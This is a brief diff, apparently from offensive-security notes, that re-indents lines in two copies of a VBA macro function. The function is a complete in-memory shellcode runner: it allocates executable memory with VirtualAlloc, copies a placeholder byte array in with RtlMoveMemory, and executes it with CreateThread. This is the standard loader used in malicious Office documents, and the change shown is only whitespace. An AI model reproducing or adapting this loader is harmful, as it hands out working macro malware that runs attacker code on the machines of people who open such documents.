@@ -42,8 +42,8 @@ Function MyMacro()
   buf = Array(YOUR ARRAY HERE)
   addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
   For counter = LBound(buf) To UBound(buf)
-  data = buf(counter)
-  res = RtlMoveMemory(addr + counter, data, 1)
+    data = buf(counter)
+    res = RtlMoveMemory(addr + counter, data, 1)
   Next counter
   res = CreateThread(0, 0, addr, 0, 0, 0)
 End Function
@@ -101,8 +101,8 @@ Function MyMacro()
   buf = Array(YOUR ARRAY HERE)
   addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
   For counter = LBound(buf) To UBound(buf)
-  data = buf(counter)
-  res = RtlMoveMemory(addr + counter, data, 1)
+    data = buf(counter)
+    res = RtlMoveMemory(addr + counter, data, 1)
   Next counter
   res = CreateThread(0, 0, addr, 0, 0, 0)
 End Function
